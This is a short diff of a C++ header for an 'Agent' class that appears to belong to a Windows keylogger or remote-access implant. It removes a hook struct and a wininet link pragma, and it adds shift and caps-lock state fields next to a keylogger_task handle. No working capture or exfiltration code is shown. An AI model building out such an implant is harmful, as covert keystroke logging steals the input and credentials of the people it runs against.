@@ -1,15 +1,7 @@
 #pragma once
-#pragma comment (lib,"wininet.lib")
 
 #include "includes.h"
 #include "define.h"
-
-typedef struct _MYHOOKDATA
-{
-	int nType;
-	HOOKPROC hkprc;
-	HHOOK hhook;
-} MYHOOKDATA;
 
 class Agent {
 
@@ -53,4 +45,7 @@ private:
 	std::string user_agent;
 	bool running;
 	HANDLE keylogger_task;
+	int shift = 0;
+	int caps = 0;
+
 };
